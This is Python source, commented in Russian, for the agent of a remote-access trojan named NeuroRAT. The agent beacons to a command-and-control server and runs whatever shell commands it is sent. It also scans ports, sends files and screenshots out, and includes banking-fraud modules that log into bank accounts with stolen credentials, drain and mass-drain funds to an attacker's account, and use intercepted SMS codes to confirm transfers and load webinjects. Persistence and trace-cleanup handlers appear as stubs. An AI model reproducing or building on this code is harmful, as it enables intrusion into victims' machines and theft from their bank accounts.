#!/usr/bin/env python3
"""
NeuroZond - Агент-зонд системы NeuroRAT
Предоставляет облегченного агента для выполнения команд и сбора данных
"""

import os
import sys
import time
import uuid
import json
import socket
import logging
import threading
import base64
import platform
import subprocess
import argparse
from typing import Dict, List, Any, Optional, Tuple, Union
from enum import Enum
import traceback

# Импортируем протокол коммуникации
from zond_protocol import (
    ZondProtocol, ZondMessage, ZondTask,
    MessageType, TaskPriority, TaskStatus
)

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('neurozond.log')
    ]
)
logger = logging.getLogger('neurozond')

# Разрешение на запись логов можно отключить в боевом режиме
ENABLE_LOGGING = True

def log(level, message):
    """Обертка для логирования с возможностью отключения"""
    if ENABLE_LOGGING:
        if level == "INFO":
            logger.info(message)
        elif level == "ERROR":
            logger.error(message)
        elif level == "WARNING":
            logger.warning(message)
        elif level == "DEBUG":
            logger.debug(message)


class CommandExecutor:
    """
    Класс для выполнения команд
    Обрабатывает различные типы команд и возвращает результаты
    """
    def __init__(self):
        """Инициализация исполнителя команд"""
        # Регистрация обработчиков команд
        self.handlers = {
            "system_info": self._handle_system_info,
            "execute_shell": self._handle_execute_shell,
            "scan_network": self._handle_scan_network,
            "download_file": self._handle_download_file,
            "upload_file": self._handle_upload_file,
            "list_dir": self._handle_list_dir,
            "screenshot": self._handle_screenshot,
            "gather_credentials": self._handle_gather_credentials,
            "memory_dump": self._handle_memory_dump,
            "persist": self._handle_persist,
            "cleanup": self._handle_cleanup,
            # Добавляем команды для взаимодействия с ATS-модулем
            "ats_login": self._handle_ats_login,
            "ats_drain": self._handle_ats_drain,
            "ats_mass_drain": self._handle_ats_mass_drain,
            "ats_intercept_sms": self._handle_ats_intercept_sms,
            "ats_load_webinject": self._handle_ats_load_webinject
        }
    
    def execute(self, command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """
        Выполнение команды с параметрами.
        
        Args:
            command: Имя команды для выполнения
            parameters: Словарь параметров команды
            
        Returns:
            Dict[str, Any]: Результат выполнения команды
        """
        log("INFO", f"Выполнение команды: {command} с параметрами: {parameters}")
        
        try:
            # Маппинг команды на соответствующий метод
            command_handlers = {
                "system_info": self._handle_system_info,
                "execute_shell": self._handle_execute_shell,
                "scan_network": self._handle_scan_network,
                "download_file": self._handle_download_file,
                "upload_file": self._handle_upload_file,
                "list_dir": self._handle_list_dir,
                "screenshot": self._handle_screenshot,
                "gather_credentials": self._handle_gather_credentials,
                "memory_dump": self._handle_memory_dump,
                "persist": self._handle_persist,
                "cleanup": self._handle_cleanup,
                # Добавляем команды для взаимодействия с ATS-модулем
                "ats_login": self._handle_ats_login,
                "ats_drain": self._handle_ats_drain,
                "ats_mass_drain": self._handle_ats_mass_drain,
                "ats_intercept_sms": self._handle_ats_intercept_sms,
                "ats_load_webinject": self._handle_ats_load_webinject
            }
            
            if command in command_handlers:
                return command_handlers[command](parameters)
            else:
                return {"status": "error", "error": f"Неизвестная команда: {command}"}
        
        except Exception as e:
            log("ERROR", f"Ошибка при выполнении команды {command}: {str(e)}\n{traceback.format_exc()}")
            return {"status": "error", "error": str(e), "traceback": traceback.format_exc()}
    
    def _handle_system_info(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Сбор информации о системе"""
        system_info = {
            "platform": platform.system(),
            "platform_version": platform.version(),
            "architecture": platform.machine(),
            "hostname": platform.node(),
            "processor": platform.processor(),
            "python_version": platform.python_version(),
            "user": os.getlogin(),
            "pid": os.getpid()
        }
        
        # Дополнительная информация в зависимости от платформы
        if platform.system() == "Windows":
            try:
                import ctypes
                system_info["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                system_info["is_admin"] = False
        else:
            system_info["is_admin"] = os.geteuid() == 0
        
        return {"system_info": system_info, "success": True}
    
    def _handle_execute_shell(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Выполнение shell-команды"""
        command = parameters.get("command", "")
        timeout = parameters.get("timeout", 60)
        
        if not command:
            return {"error": "Команда не указана", "success": False}
        
        try:
            # Выполняем команду через subprocess
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            stdout, stderr = process.communicate(timeout=timeout)
            
            return {
                "stdout": stdout,
                "stderr": stderr,
                "exit_code": process.returncode,
                "success": process.returncode == 0
            }
        except subprocess.TimeoutExpired:
            process.kill()
            return {
                "error": f"Превышено время выполнения команды ({timeout}с)",
                "success": False
            }
        except Exception as e:
            return {"error": str(e), "success": False}
    
    def _handle_scan_network(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Сканирование сети"""
        target = parameters.get("target", "127.0.0.1")
        ports = parameters.get("ports", [80, 443, 22, 21, 3389])
        timeout = parameters.get("timeout", 1)
        
        results = {}
        
        # Если указан диапазон IP в формате CIDR (например, 192.168.1.0/24)
        if "/" in target:
            # Здесь должен быть код для сканирования подсети
            # В простом примере просто возвращаем ошибку
            return {
                "error": "Сканирование подсети пока не реализовано",
                "success": False
            }
        else:
            # Сканируем отдельный хост
            open_ports = []
            for port in ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                
                sock.close()
            
            results[target] = open_ports
        
        return {
            "open_ports": results,
            "success": True
        }
    
    def _handle_download_file(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Загрузка файла с сервера на зонд"""
        file_content_b64 = parameters.get("file_content")
        file_path = parameters.get("file_path")
        
        if not file_content_b64 or not file_path:
            return {
                "error": "Необходимо указать содержимое файла и путь",
                "success": False
            }
        
        try:
            # Декодируем содержимое файла из base64
            file_content = base64.b64decode(file_content_b64)
            
            # Создаем директории, если не существуют
            os.makedirs(os.path.dirname(os.path.abspath(file_path)), exist_ok=True)
            
            # Записываем содержимое в файл
            with open(file_path, "wb") as f:
                f.write(file_content)
            
            return {
                "file_path": file_path,
                "file_size": len(file_content),
                "success": True
            }
        except Exception as e:
            return {"error": str(e), "success": False}
    
    def _handle_upload_file(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Загрузка файла с зонда на сервер"""
        file_path = parameters.get("file_path")
        
        if not file_path:
            return {
                "error": "Необходимо указать путь к файлу",
                "success": False
            }
        
        try:
            # Проверяем существование файла
            if not os.path.exists(file_path):
                return {
                    "error": f"Файл не найден: {file_path}",
                    "success": False
                }
            
            # Читаем содержимое файла
            with open(file_path, "rb") as f:
                file_content = f.read()
            
            # Кодируем содержимое в base64
            file_content_b64 = base64.b64encode(file_content).decode()
            
            return {
                "file_path": file_path,
                "file_size": len(file_content),
                "file_content": file_content_b64,
                "success": True
            }
        except Exception as e:
            return {"error": str(e), "success": False}
    
    def _handle_list_dir(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Получение списка файлов в директории"""
        dir_path = parameters.get("dir_path", ".")
        
        try:
            # Получаем список файлов и директорий
            items = []
            
            for item in os.listdir(dir_path):
                item_path = os.path.join(dir_path, item)
                item_info = {
                    "name": item,
                    "path": item_path,
                    "is_dir": os.path.isdir(item_path),
                    "size": os.path.getsize(item_path) if os.path.isfile(item_path) else 0,
                    "modified": os.path.getmtime(item_path)
                }
                items.append(item_info)
            
            return {
                "items": items,
                "dir_path": dir_path,
                "success": True
            }
        except Exception as e:
            return {"error": str(e), "success": False}
    
    def _handle_screenshot(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Создание снимка экрана"""
        try:
            # Пытаемся использовать PIL для создания скриншота
            from PIL import ImageGrab
            
            # Создаем временный файл для скриншота
            temp_file = f"screenshot_{int(time.time())}.png"
            
            # Делаем скриншот
            screenshot = ImageGrab.grab()
            screenshot.save(temp_file)
            
            # Загружаем скриншот
            with open(temp_file, "rb") as f:
                screenshot_data = f.read()
            
            # Удаляем временный файл
            try:
                os.remove(temp_file)
            except:
                pass
            
            # Кодируем скриншот в base64
            screenshot_b64 = base64.b64encode(screenshot_data).decode()
            
            return {
                "screenshot": screenshot_b64,
                "width": screenshot.width,
                "height": screenshot.height,
                "success": True
            }
        except ImportError:
            return {
                "error": "Не установлен модуль PIL для создания скриншотов",
                "success": False
            }
        except Exception as e:
            return {"error": str(e), "success": False}
    
    def _handle_gather_credentials(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Сбор учетных данных"""
        # В простом примере просто имитируем сбор данных
        # В реальной реализации здесь должен быть код для поиска и сбора учетных данных
        
        return {
            "credentials": [],
            "success": True,
            "message": "Функция сбора учетных данных не реализована в этой версии"
        }
    
    def _handle_memory_dump(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Дамп памяти процесса"""
        pid = parameters.get("pid")
        
        if not pid:
            return {
                "error": "Необходимо указать PID процесса",
                "success": False
            }
        
        # В простом примере просто имитируем дамп памяти
        # В реальной реализации здесь должен быть код для создания дампа памяти
        
        return {
            "success": False,
            "error": "Функция дампа памяти не реализована в этой версии"
        }
    
    def _handle_persist(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Установка персистентности"""
        method = parameters.get("method", "startup")
        
        # В простом примере просто имитируем установку персистентности
        # В реальной реализации здесь должен быть код для установки агента в автозагрузку
        
        return {
            "success": True,
            "method": method,
            "message": "Функция персистентности не реализована в этой версии"
        }
    
    def _handle_cleanup(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Очистка следов присутствия"""
        # В простом примере просто имитируем очистку
        # В реальной реализации здесь должен быть код для удаления логов, временных файлов и т.д.
        
        return {
            "success": True,
            "message": "Функция очистки не реализована в этой версии"
        }

    def _handle_ats_login(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """
        Выполнение входа в банковский аккаунт через ATS-модуль.
        
        Args:
            parameters:
                bank_type: Тип банка
                credentials: Словарь с учетными данными
                
        Returns:
            Dict[str, Any]: Результат операции
        """
        try:
            # Проверяем наличие необходимых параметров
            if "bank_type" not in parameters or "credentials" not in parameters:
                return {"status": "error", "error": "Не указаны обязательные параметры: bank_type, credentials"}
            
            bank_type = parameters["bank_type"]
            credentials = parameters["credentials"]
            
            # Импортируем ATS-модуль локально (если он установлен)
            try:
                from agent_modules.ats_module import create_ats
                
                # Создаем или получаем экземпляр ATS
                if not hasattr(self, '_ats_instance') or self._ats_instance is None:
                    config_file = parameters.get("config_file", None)
                    self._ats_instance = create_ats(config_file)
                    log("INFO", f"ATS-модуль инициализирован с конфигурацией: {config_file}")
                
                # Выполняем вход
                result = self._ats_instance.login_to_bank(bank_type, credentials)
                
                # Если вход успешен, сохраняем сессию
                if result:
                    session_id = None
                    for sid, session in self._ats_instance.active_sessions.items():
                        if session.bank_type == bank_type and session.authenticated:
                            session_id = sid
                            break
                    
                    return {
                        "status": "success" if result else "error",
                        "message": "Вход выполнен успешно" if result else "Ошибка входа",
                        "session_id": session_id,
                        "bank_type": bank_type
                    }
                else:
                    return {"status": "error", "message": "Ошибка входа в банк"}
                
            except ImportError:
                return {"status": "error", "error": "ATS-модуль не установлен"}
            
        except Exception as e:
            log("ERROR", f"Ошибка входа в банк через ATS: {str(e)}")
            return {"status": "error", "error": str(e)}

    def _handle_ats_drain(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """
        Выполнение дрейна средств с банковского счета через ATS.
        
        Args:
            parameters:
                session_id: ID сессии банка
                target_account: Счет получателя
                amount: Сумма для перевода (опционально)
                
        Returns:
            Dict[str, Any]: Результат операции
        """
        try:
            # Проверяем наличие необходимых параметров
            if "session_id" not in parameters or "target_account" not in parameters:
                return {"status": "error", "error": "Не указаны обязательные параметры: session_id, target_account"}
            
            session_id = parameters["session_id"]
            target_account = parameters["target_account"]
            amount = parameters.get("amount", None)
            
            # Проверяем инициализацию ATS
            if not hasattr(self, '_ats_instance') or self._ats_instance is None:
                return {"status": "error", "error": "ATS-модуль не инициализирован"}
            
            # Выполняем дрейн
            result = self._ats_instance.drain_account(session_id, target_account, amount)
            
            # Логируем результат операции
            log("INFO", f"Выполнен дрейн аккаунта через ATS: {result}")
            
            return result
            
        except Exception as e:
            log("ERROR", f"Ошибка дрейна аккаунта через ATS: {str(e)}")
            return {"status": "error", "error": str(e)}

    def _handle_ats_mass_drain(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """
        Выполнение массового дрейна средств с нескольких аккаунтов через ATS.
        
        Args:
            parameters:
                credentials_list: Список учетных данных для банковских аккаунтов
                target_account: Счет получателя
                
        Returns:
            Dict[str, Any]: Результат операции
        """
        try:
            # Проверяем наличие необходимых параметров
            if "credentials_list" not in parameters or "target_account" not in parameters:
                return {"status": "error", "error": "Не указаны обязательные параметры: credentials_list, target_account"}
            
            credentials_list = parameters["credentials_list"]
            target_account = parameters["target_account"]
            
            # Проверяем инициализацию ATS
            if not hasattr(self, '_ats_instance') or self._ats_instance is None:
                return {"status": "error", "error": "ATS-модуль не инициализирован"}
            
            # Выполняем массовый дрейн
            result = self._ats_instance.mass_drain(credentials_list, target_account)
            
            # Логируем результат операции
            log("INFO", f"Выполнен массовый дрейн аккаунтов через ATS: {len(credentials_list)} аккаунтов, успешно: {result.get('successful', 0)}")
            
            return result
            
        except Exception as e:
            log("ERROR", f"Ошибка массового дрейна аккаунтов через ATS: {str(e)}")
            return {"status": "error", "error": str(e)}

    def _handle_ats_intercept_sms(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """
        Обработка перехваченного SMS-кода и использование его для подтверждения операций.
        
        Args:
            parameters:
                phone_number: Номер телефона
                code: Перехваченный код
                
        Returns:
            Dict[str, Any]: Результат операции
        """
        try:
            # Проверяем наличие необходимых параметров
            if "phone_number" not in parameters or "code" not in parameters:
                return {"status": "error", "error": "Не указаны обязательные параметры: phone_number, code"}
            
            phone_number = parameters["phone_number"]
            code = parameters["code"]
            
            # Проверяем инициализацию ATS
            if not hasattr(self, '_ats_instance') or self._ats_instance is None:
                return {"status": "error", "error": "ATS-модуль не инициализирован"}
            
            # Добавляем перехваченный код в хранилище
            self._ats_instance.sms_interceptor.add_intercepted_code(phone_number, code)
            
            # Ищем активные сессии, ожидающие подтверждения для этого номера
            pending_sessions = []
            for session_id, session in self._ats_instance.active_sessions.items():
                if hasattr(session, 'last_result') and session.last_result and session.last_result.get('status') == 'confirmation_required':
                    pending_sessions.append(session_id)
            
            log("INFO", f"Перехвачен SMS-код для номера {phone_number}, найдено {len(pending_sessions)} сессий, ожидающих подтверждения")
            
            # Если есть ожидающие сессии, пытаемся подтвердить перевод
            if pending_sessions:
                for session_id in pending_sessions:
                    result = self._ats_instance.confirm_transfer_with_sms(session_id, phone_number)
                    if result.get('status') == 'success':
                        return {
                            "status": "success",
                            "message": "Операция успешно подтверждена",
                            "session_id": session_id,
                            "result": result
                        }
            
            return {
                "status": "pending",
                "message": "SMS-код добавлен, но нет активных операций для подтверждения",
                "phone_number": phone_number,
                "pending_sessions": len(pending_sessions)
            }
            
        except Exception as e:
            log("ERROR", f"Ошибка обработки перехваченного SMS: {str(e)}")
            return {"status": "error", "error": str(e)}

    def _handle_ats_load_webinject(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """
        Загрузка и установка пользовательского веб-инжекта для ATS.
        
        Args:
            parameters:
                bank_type: Тип банка
                inject_data: Данные веб-инжекта
                inject_file: Путь к файлу веб-инжекта (опционально)
                
        Returns:
            Dict[str, Any]: Результат операции
        """
        try:
            # Проверяем наличие необходимых параметров
            if "bank_type" not in parameters:
                return {"status": "error", "error": "Не указан обязательный параметр: bank_type"}
            
            if "inject_data" not in parameters and "inject_file" not in parameters:
                return {"status": "error", "error": "Необходимо указать либо inject_data, либо inject_file"}
            
            bank_type = parameters["bank_type"]
            
            # Проверяем инициализацию ATS
            if not hasattr(self, '_ats_instance') or self._ats_instance is None:
                try:
                    from agent_modules.ats_module import create_ats
                    config_file = parameters.get("config_file", None)
                    self._ats_instance = create_ats(config_file)
                except ImportError:
                    return {"status": "error", "error": "ATS-модуль не установлен"}
            
            # Получаем данные инжекта
            inject_data = None
            if "inject_data" in parameters:
                inject_data = parameters["inject_data"]
            elif "inject_file" in parameters:
                try:
                    with open(parameters["inject_file"], 'r') as f:
                        inject_data = json.load(f)
                except Exception as e:
                    return {"status": "error", "error": f"Ошибка загрузки файла инжекта: {str(e)}"}
            
            # Создаем директорию для инжектов, если её нет
            inject_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "webinjects")
            os.makedirs(inject_dir, exist_ok=True)
            
            # Сохраняем инжект в файл
            inject_file_path = os.path.join(inject_dir, f"{bank_type}.json")
            with open(inject_file_path, 'w') as f:
                json.dump(inject_data, f, indent=2)
            
            # Если есть экземпляр WebInject для данного банка, обновляем его
            if hasattr(self._ats_instance, 'active_sessions'):
                for session_id, session in self._ats_instance.active_sessions.items():
                    if session.bank_type == bank_type and hasattr(session, 'webinject'):
                        session.webinject.webinjects = inject_data
            
            return {
                "status": "success",
                "message": f"Веб-инжект для {bank_type} успешно загружен",
                "path": inject_file_path
            }
            
        except Exception as e:
            log("ERROR", f"Ошибка загрузки веб-инжекта: {str(e)}")
            return {"status": "error", "error": str(e)}


class NeuroZond:
    """
    Основной класс зонда NeuroZond
    """
    def __init__(
        self,
        zond_id: Optional[str] = None,
        c1_host: str = "127.0.0.1",
        c1_port: int = 8443,
        secret_key: str = "shared_secret_key",
        encryption_key: str = "encryption_key_example",
        heartbeat_interval: int = 60,
        reconnect_interval: int = 30
    ):
        """
        Инициализация зонда
        
        Args:
            zond_id: Идентификатор зонда (если None, генерируется)
            c1_host: Хост сервера C1
            c1_port: Порт сервера C1
            secret_key: Секретный ключ для подписи сообщений
            encryption_key: Ключ шифрования сообщений
            heartbeat_interval: Интервал отправки heartbeat (в секундах)
            reconnect_interval: Интервал переподключения при обрыве связи (в секундах)
        """
        self.zond_id = zond_id or f"zond_{str(uuid.uuid4())[:8]}"
        self.c1_host = c1_host
        self.c1_port = c1_port
        self.secret_key = secret_key
        self.encryption_key = encryption_key
        self.heartbeat_interval = heartbeat_interval
        self.reconnect_interval = reconnect_interval
        
        # Создаем протокол для зонда
        self.protocol = ZondProtocol(
            agent_id=self.zond_id,
            secret_key=self.secret_key,
            encryption_key=self.encryption_key
        )
        
        # Создаем исполнителя команд
        self.executor = CommandExecutor()
        
        # Сокет для связи с C1
        self.socket = None
        
        # Блокировка для потокобезопасности
        self.lock = threading.RLock()
        
        # Флаги состояния
        self.running = False
        self.connected = False
        
        # Хранилище выполняемых задач
        self.tasks: Dict[str, ZondTask] = {}
        
        # Очередь исходящих сообщений
        self.outgoing_queue: List[Tuple[ZondMessage, float]] = []
    
    def connect(self) -> bool:
        """
        Подключается к серверу C1
        
        Returns:
            bool: True если подключение успешно, иначе False
        """
        with self.lock:
            if self.connected:
                return True
            
            try:
                # Создаем новый сокет
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)
                
                # Подключаемся к серверу C1
                self.socket.connect((self.c1_host, self.c1_port))
                
                # Помечаем как подключенный
                self.connected = True
                
                log("INFO", f"Подключен к серверу C1 ({self.c1_host}:{self.c1_port})")
                
                # Отправляем регистрационное сообщение
                self._send_registration()
                
                return True
            
            except Exception as e:
                log("ERROR", f"Ошибка при подключении к серверу C1: {str(e)}")
                
                # Закрываем сокет, если он был создан
                if self.socket:
                    try:
                        self.socket.close()
                    except:
                        pass
                    
                    self.socket = None
                
                self.connected = False
                return False
    
    def disconnect(self) -> None:
        """Отключается от сервера C1"""
        with self.lock:
            if not self.connected:
                return
            
            try:
                # Закрываем сокет
                if self.socket:
                    self.socket.close()
                    self.socket = None
                
                self.connected = False
                log("INFO", "Отключен от сервера C1")
            
            except Exception as e:
                log("ERROR", f"Ошибка при отключении от сервера C1: {str(e)}")
    
    def _reconnect_loop(self) -> None:
        """Поток для автоматического переподключения к серверу C1"""
        while self.running:
            if not self.connected:
                # Пытаемся подключиться
                success = self.connect()
                
                if not success:
                    # Если не удалось, ждем перед следующей попыткой
                    time.sleep(self.reconnect_interval)
                    continue
            
            # Если подключены, просто ждем
            time.sleep(self.reconnect_interval)
    
    def _heartbeat_loop(self) -> None:
        """Поток для отправки heartbeat"""
        last_heartbeat = 0
        
        while self.running:
            current_time = time.time()
            
            # Отправляем heartbeat, если прошло достаточно времени
            if current_time - last_heartbeat > self.heartbeat_interval:
                if self.connected:
                    try:
                        self._send_heartbeat()
                        last_heartbeat = current_time
                    except:
                        # Если произошла ошибка, пытаемся переподключиться
                        self.disconnect()
            
            # Спим немного, чтобы не нагружать CPU
            time.sleep(5)
    
    def _send_message(self, message: ZondMessage) -> bool:
        """
        Отправляет сообщение серверу C1
        
        Args:
            message: Сообщение для отправки
            
        Returns:
            bool: True если сообщение успешно отправлено, иначе False
        """
        with self.lock:
            if not self.connected:
                # Добавляем в очередь для последующей отправки
                self.outgoing_queue.append((message, time.time()))
                return False
            
            try:
                # Шифруем сообщение
                encrypted_message = self.protocol.encrypt_message(message)
                
                # Отправляем сообщение
                self.socket.sendall(encrypted_message.encode() + b'\n')
                
                return True
            
            except Exception as e:
                log("ERROR", f"Ошибка при отправке сообщения: {str(e)}")
                
                # Помечаем как отключенный
                self.disconnect()
                
                # Добавляем в очередь для последующей отправки
                self.outgoing_queue.append((message, time.time()))
                
                return False
    
    def _process_outgoing_queue(self) -> None:
        """Обрабатывает очередь исходящих сообщений"""
        with self.lock:
            if not self.connected or not self.outgoing_queue:
                return
            
            # Копируем очередь, чтобы не изменять ее во время итерации
            queue_copy = self.outgoing_queue.copy()
            self.outgoing_queue = []
            
            for message, timestamp in queue_copy:
                try:
                    # Шифруем сообщение
                    encrypted_message = self.protocol.encrypt_message(message)
                    
                    # Отправляем сообщение
                    self.socket.sendall(encrypted_message.encode() + b'\n')
                    
                    log("DEBUG", f"Отправлено отложенное сообщение: {message.message_id}")
                
                except Exception as e:
                    log("ERROR", f"Ошибка при отправке отложенного сообщения: {str(e)}")
                    
                    # Возвращаем сообщение в очередь
                    self.outgoing_queue.append((message, timestamp))
                    
                    # Помечаем как отключенный
                    self.disconnect()
                    break
    
    def _send_heartbeat(self) -> None:
        """Отправляет heartbeat серверу C1"""
        heartbeat_message = self.protocol.create_heartbeat("c1_server")
        self._send_message(heartbeat_message)
    
    def _send_registration(self) -> None:
        """Отправляет регистрационное сообщение серверу C1"""
        # Собираем информацию о системе
        system_info = self.executor.execute("system_info", {}).get("system_info", {})
        
        # Список возможностей зонда
        capabilities = list(self.executor.handlers.keys())
        
        # Создаем сообщение регистрации
        registration_message = self.protocol.create_registration(
            system_info=system_info,
            capabilities=capabilities,
            receiver_id="c1_server"
        )
        
        # Отправляем сообщение
        self._send_message(registration_message)
    
    def _send_task_result(self, task_id: str, status: TaskStatus, result: Dict[str, Any]) -> None:
        """
        Отправляет результат выполнения задачи серверу C1
        
        Args:
            task_id: Идентификатор задачи
            status: Статус выполнения
            result: Результат выполнения
        """
        result_message = self.protocol.create_result(
            task_id=task_id,
            status=status,
            result_data=result,
            receiver_id="c1_server"
        )
        
        self._send_message(result_message)
    
    def _process_command(self, task: ZondTask) -> None:
        """
        Обрабатывает команду
        
        Args:
            task: Задача для выполнения
        """
        # Помечаем задачу как выполняемую
        with self.lock:
            self.tasks[task.task_id] = task
            task.update_status(TaskStatus.RUNNING)
        
        try:
            # Выполняем команду
            result = self.executor.execute(task.command, task.parameters)
            
            # Определяем статус выполнения
            status = TaskStatus.COMPLETED if result.get("success", False) else TaskStatus.FAILED
            
            # Отправляем результат
            self._send_task_result(task.task_id, status, result)
            
            # Обновляем статус задачи
            with self.lock:
                task.update_status(status, result)
        
        except Exception as e:
            log("ERROR", f"Ошибка при выполнении задачи {task.task_id}: {str(e)}")
            
            # Отправляем сообщение об ошибке
            error_result = {"error": str(e), "success": False}
            self._send_task_result(task.task_id, TaskStatus.FAILED, error_result)
            
            # Обновляем статус задачи
            with self.lock:
                task.update_status(TaskStatus.FAILED, error_result)
    
    def _receive_loop(self) -> None:
        """Поток для приема сообщений от сервера C1"""
        buffer = ""
        
        while self.running:
            if not self.connected:
                time.sleep(1)
                continue
            
            try:
                # Устанавливаем таймаут для чтения
                self.socket.settimeout(1)
                
                # Читаем данные
                data = self.socket.recv(4096)
                
                if not data:
                    # Если данных нет, соединение закрыто
                    log("WARNING", "Соединение с сервером C1 закрыто")
                    self.disconnect()
                    continue
                
                # Добавляем полученные данные в буфер
                buffer += data.decode()
                
                # Обрабатываем полные сообщения
                while '\n' in buffer:
                    message_str, buffer = buffer.split('\n', 1)
                    
                    # Обрабатываем сообщение
                    self._handle_message(message_str)
            
            except socket.timeout:
                # Таймаут при чтении, это нормально
                continue
            
            except Exception as e:
                log("ERROR", f"Ошибка при приеме сообщений: {str(e)}")
                self.disconnect()
                time.sleep(1)
    
    def _handle_message(self, encrypted_message: str) -> None:
        """
        Обрабатывает полученное сообщение
        
        Args:
            encrypted_message: Зашифрованное сообщение
        """
        # Дешифруем сообщение
        message = self.protocol.decrypt_message(encrypted_message)
        
        if not message:
            log("ERROR", "Ошибка при дешифровании сообщения")
            return
        
        # Обрабатываем сообщение в зависимости от типа
        if message.message_type == MessageType.COMMAND:
            self._handle_command(message)
        elif message.message_type == MessageType.HEARTBEAT:
            self._handle_heartbeat(message)
        else:
            log("WARNING", f"Получено сообщение неизвестного типа: {message.message_type.value}")
    
    def _handle_command(self, message: ZondMessage) -> None:
        """
        Обрабатывает сообщение с командой
        
        Args:
            message: Сообщение с командой
        """
        task_data = message.data.get("task")
        
        if not task_data:
            log("ERROR", "Получена команда без данных задачи")
            return
        
        # Создаем объект задачи
        try:
            task = ZondTask.from_dict(task_data)
        except Exception as e:
            log("ERROR", f"Ошибка при обработке данных задачи: {str(e)}")
            return
        
        log("INFO", f"Получена команда {task.command} (задача {task.task_id})")
        
        # Запускаем отдельный поток для выполнения команды
        thread = threading.Thread(
            target=self._process_command,
            args=(task,),
            daemon=True,
            name=f"Task_{task.task_id}"
        )
        thread.start()
    
    def _handle_heartbeat(self, message: ZondMessage) -> None:
        """
        Обрабатывает heartbeat от сервера C1
        
        Args:
            message: Heartbeat сообщение
        """
        # Отправляем ответный heartbeat
        self._send_heartbeat()
    
    def _task_monitor(self) -> None:
        """Поток для мониторинга выполнения задач"""
        while self.running:
            with self.lock:
                current_time = time.time()
                
                # Проверяем задачи на таймаут
                for task_id, task in list(self.tasks.items()):
                    if task.status == TaskStatus.RUNNING and task.timeout:
                        # Если задача выполняется дольше таймаута
                        if (current_time - task.updated_at) > task.timeout:
                            # Помечаем как просроченную
                            task.update_status(TaskStatus.TIMEOUT)
                            
                            # Отправляем результат с ошибкой
                            result = {
                                "error": f"Превышено время выполнения ({task.timeout}с)",
                                "success": False
                            }
                            self._send_task_result(task_id, TaskStatus.TIMEOUT, result)
                
                # Удаляем завершенные задачи старше 1 часа
                completed_statuses = [TaskStatus.COMPLETED, TaskStatus.FAILED, TaskStatus.TIMEOUT, TaskStatus.CANCELED]
                
                tasks_to_remove = []
                for task_id, task in self.tasks.items():
                    if task.status in completed_statuses:
                        if (current_time - task.updated_at) > 3600:
                            tasks_to_remove.append(task_id)
                
                for task_id in tasks_to_remove:
                    del self.tasks[task_id]
            
            # Спим немного, чтобы не нагружать CPU
            time.sleep(10)
    
    def start(self) -> None:
        """Запускает зонд"""
        if self.running:
            return
        
        self.running = True
        
        # Запускаем поток для переподключения
        threading.Thread(
            target=self._reconnect_loop,
            daemon=True,
            name="ReconnectLoop"
        ).start()
        
        # Запускаем поток для отправки heartbeat
        threading.Thread(
            target=self._heartbeat_loop,
            daemon=True,
            name="HeartbeatLoop"
        ).start()
        
        # Запускаем поток для приема сообщений
        threading.Thread(
            target=self._receive_loop,
            daemon=True,
            name="ReceiveLoop"
        ).start()
        
        # Запускаем поток для мониторинга задач
        threading.Thread(
            target=self._task_monitor,
            daemon=True,
            name="TaskMonitor"
        ).start()
        
        log("INFO", f"Зонд {self.zond_id} запущен")
    
    def stop(self) -> None:
        """Останавливает зонд"""
        if not self.running:
            return
        
        self.running = False
        self.disconnect()
        
        log("INFO", f"Зонд {self.zond_id} остановлен")


def main():
    """Точка входа программы"""
    parser = argparse.ArgumentParser(description="NeuroZond - Агент-зонд системы NeuroRAT")
    
    parser.add_argument("--host", default="127.0.0.1", help="Хост сервера C1")
    parser.add_argument("--port", type=int, default=8443, help="Порт сервера C1")
    parser.add_argument("--id", help="Идентификатор зонда (если не указан, генерируется)")
    parser.add_argument("--secret", default="shared_secret_key", help="Секретный ключ")
    parser.add_argument("--key", default="encryption_key_example", help="Ключ шифрования")
    parser.add_argument("--heartbeat", type=int, default=60, help="Интервал heartbeat (сек)")
    parser.add_argument("--reconnect", type=int, default=30, help="Интервал переподключения (сек)")
    parser.add_argument("--no-log", action="store_true", help="Отключить запись логов")
    
    args = parser.parse_args()
    
    # Отключаем логирование, если указан флаг --no-log
    global ENABLE_LOGGING
    ENABLE_LOGGING = not args.no_log
    
    # Создаем экземпляр зонда
    zond = NeuroZond(
        zond_id=args.id,
        c1_host=args.host,
        c1_port=args.port,
        secret_key=args.secret,
        encryption_key=args.key,
        heartbeat_interval=args.heartbeat,
        reconnect_interval=args.reconnect
    )
    
    # Запускаем зонд
    zond.start()
    
    try:
        # Основной цикл программы
        while True:
            time.sleep(1)
    
    except KeyboardInterrupt:
        print("Останавливаем зонд...")
        zond.stop()
        print("Зонд остановлен")


# Точка входа программы
if __name__ == "__main__":
    main() 